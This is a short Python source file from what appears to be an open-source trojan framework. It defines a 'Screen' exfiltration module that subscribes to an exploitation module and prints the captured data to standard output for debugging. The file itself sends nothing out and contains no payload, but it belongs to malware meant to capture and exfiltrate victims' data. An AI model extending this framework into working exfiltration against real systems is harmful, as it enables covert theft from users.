#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

from src.modules.exploitation.exploitation_module import ExploitationModule
from src.modules.exfiltration.exfiltration_module import ExfiltrationModule


class Screen(ExfiltrationModule):
    def __init__(self, *, module: ExploitationModule):
        """Exfiltrate data to the screen for debugging purposes.

        Args:
            module: Instance of ExploitationModule to which the
                exfiltrator receive data by attaching itself as a
                subscriber.
        """

        super().__init__(module)

    def update(self, message: str) -> None:
        """Display captured data at STDOUT for debugging purposes."""
        print(message)
